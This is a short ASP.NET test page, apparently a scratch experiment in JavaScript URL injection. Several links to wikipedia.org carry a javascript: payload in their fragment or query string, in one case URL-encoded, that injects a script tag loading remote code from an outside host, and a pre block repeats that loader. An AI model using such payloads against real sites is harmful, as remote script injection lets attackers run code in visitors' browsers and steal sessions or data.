<%@ Page Language="C#" %>

<!DOCTYPE html>

<script runat="server">

</script>

<html xmlns="http://www.w3.org/1999/xhtml">
<head runat="server">
    <title></title>
</head>
<body>
    <form id="form1" runat="server">
    <div>
    
        <a href="http://wikipedia.org#javascript:script=document.createElement('script');script.type='text/javascript';script.src='http://net4.ccs.neu.edu/home/jga/experiments/javascript/injection/000.js';document.getElementsByTagName('head')[0].appendChild(script);">ewq</a>
        <a href="http://bit.ly/Na5DJH">ewq</a>

        <a href="http://wikipedia.org?name%3Djavascript%3Ascript%3Ddocument.createElement(%27script%27)%3Bscript.type%3D%27text%2Fjavascript%27%3Bscript.src%3D%27http%3A%2F%2Fnet4.ccs.neu.edu%2Fhome%2Fjga%2Fexperiments%2Fjavascript%2Finjection%2F000.js%27%3Bdocument.getElementsByTagName(%27head%27)%5B0%5D.appendChild(script)%3B">fff</a>

        http://bit.ly/Na5DJH
        <pre>
            javascript:var script = document.createElement('script');script.type = 'text/javascript';script.src = 'http://net4.ccs.neu.edu/home/jga/experiments/javascript/injection/000.js';document.getElementsByTagName('head')[0].appendChild(script);

        </pre>

    </div>
    </form>
</body>
</html>
